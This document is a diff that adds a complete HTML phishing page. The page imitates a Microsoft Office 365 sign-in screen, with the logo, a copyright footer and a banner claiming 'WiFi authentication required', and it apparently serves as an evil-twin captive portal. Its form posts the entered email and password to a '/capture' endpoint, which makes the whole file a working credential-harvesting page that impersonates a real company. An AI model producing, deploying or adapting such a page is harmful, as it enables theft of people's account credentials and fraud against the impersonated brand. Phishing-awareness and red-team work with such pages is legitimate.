@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f2f1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 44px;
+            width: 440px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+        .logo {
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1b1a19;
+        }
+        .announcement {
+            background: #fff4ce;
+            border-left: 4px solid #ffb900;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .form-group {
+            margin: 16px 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #8a8886;
+            font-size: 15px;
+        }
+        input:focus {
+            border-color: #0078d4;
+            outline: none;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 16px 0;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin-right: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+        button:hover { background: #106ebe; }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #605e5c;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg width="108" height="24" viewBox="0 0 108 24">
+                <rect width="10" height="10" fill="#F25022"/>
+                <rect x="12" width="10" height="10" fill="#7FBA00"/>
+                <rect y="12" width="10" height="10" fill="#00A4EF"/>
+                <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
+            </svg>
+        </div>
+
+        <h1>Sign in</h1>
+
+        <div class="announcement">
+            <strong>Important:</strong> WiFi authentication required. Use your Office 365 credentials.
+        </div>
+
+        <form method="POST" action="/capture">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember">
+                <label for="remember">Keep me signed in</label>
+            </div>
+            <button type="submit">Sign in</button>
+        </form>
+
+        <div class="footer">
+            © 2025 Microsoft Corporation. All rights reserved.
+        </div>
+    </div>
+</body>
+</html>
